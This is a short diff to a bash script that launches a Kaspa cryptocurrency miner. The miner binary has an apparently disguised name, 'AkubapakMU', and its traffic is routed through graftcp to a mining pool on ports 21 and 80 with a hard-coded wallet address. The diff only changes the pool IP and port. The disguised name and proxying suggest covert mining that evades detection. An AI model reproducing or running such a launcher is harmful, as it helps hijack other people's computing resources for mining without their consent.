@@ -28,7 +28,7 @@ chmod 700 AkubapakMU
 
 #!/bin/bash
 
-POOL=159.223.188.176:80
+POOL=51.79.222.181:21
 WALLET=kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg
 
 ./graftcp/graftcp ./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
